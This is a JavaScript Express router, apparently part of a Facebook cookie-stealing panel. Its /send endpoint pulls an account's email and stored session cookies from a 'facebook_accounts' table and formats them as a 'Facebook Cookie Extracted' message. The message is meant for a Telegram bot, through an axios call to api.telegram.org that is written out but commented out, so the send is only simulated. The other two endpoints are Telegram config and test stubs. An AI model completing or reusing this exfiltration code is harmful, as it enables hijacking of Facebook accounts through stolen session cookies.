import express from "express";
import db from "../database.js";

const router = express.Router();

/**
 * POST /api/telegram/send
 * Send cookie data to Telegram bot
 */
router.post("/send", async (req, res) => {
  try {
    const { accountId, chatId } = req.body;

    if (!accountId) {
      return res.status(400).json({
        success: false,
        message: "Account ID is required",
      });
    }

    // Get account and cookie data
    const [rows] = await db.execute(
      "SELECT email, cookie_data FROM facebook_accounts WHERE id = ?",
      [accountId]
    );

    if (rows.length === 0) {
      return res.status(404).json({
        success: false,
        message: "Account not found",
      });
    }

    const { email, cookie_data } = rows[0];

    if (!cookie_data) {
      return res.status(404).json({
        success: false,
        message: "No cookies found for this account",
      });
    }

    // In production, you'd send this via Telegram Bot API
    // For now, simulate success
    const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
    const telegramChatId = chatId || process.env.TELEGRAM_CHAT_ID;

    if (!telegramBotToken || !telegramChatId) {
      return res.status(400).json({
        success: false,
        message: "Telegram configuration missing. Please set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in environment variables.",
      });
    }

    // Format message
    const message = `
🔐 **Facebook Cookie Extracted**

📧 Email: ${email}
🍪 Cookies: ${cookie_data.length} bytes
⏰ Time: ${new Date().toLocaleString("vi-VN")}

Cookie Data:
\`\`\`
${cookie_data}
\`\`\`
    `.trim();

    // In production, send via Telegram API:
    // await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
    //   chat_id: telegramChatId,
    //   text: message,
    //   parse_mode: 'Markdown'
    // });

    console.log("Would send to Telegram:", {
      chatId: telegramChatId,
      messageLength: message.length,
    });

    res.json({
      success: true,
      message: "Cookie sent to Telegram successfully",
      preview: message.substring(0, 200) + "...",
    });
  } catch (error) {
    console.error("Error sending to Telegram:", error);
    res.status(500).json({
      success: false,
      message: "Failed to send to Telegram",
      error: error.message,
    });
  }
});

/**
 * POST /api/telegram/config
 * Configure Telegram bot settings
 */
router.post("/config", async (req, res) => {
  try {
    const { botToken, chatId } = req.body;

    if (!botToken || !chatId) {
      return res.status(400).json({
        success: false,
        message: "Bot token and chat ID are required",
      });
    }

    // In production, you'd save this to database or config file
    // For now, just validate and return success
    res.json({
      success: true,
      message: "Telegram configuration saved",
      config: {
        botToken: botToken.substring(0, 10) + "...",
        chatId,
      },
    });
  } catch (error) {
    console.error("Error configuring Telegram:", error);
    res.status(500).json({
      success: false,
      message: "Failed to configure Telegram",
      error: error.message,
    });
  }
});

/**
 * POST /api/telegram/test
 * Test Telegram bot connection
 */
router.post("/test", async (req, res) => {
  try {
    const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
    const telegramChatId = process.env.TELEGRAM_CHAT_ID;

    if (!telegramBotToken || !telegramChatId) {
      return res.status(400).json({
        success: false,
        message: "Telegram configuration missing",
      });
    }

    // In production, test with actual API call
    const testMessage = "✅ Telegram bot connection test successful!";

    console.log("Would send test message to Telegram:", {
      chatId: telegramChatId,
      message: testMessage,
    });

    res.json({
      success: true,
      message: "Telegram connection test successful",
    });
  } catch (error) {
    console.error("Error testing Telegram:", error);
    res.status(500).json({
      success: false,
      message: "Failed to test Telegram connection",
      error: error.message,
    });
  }
});

export default router;
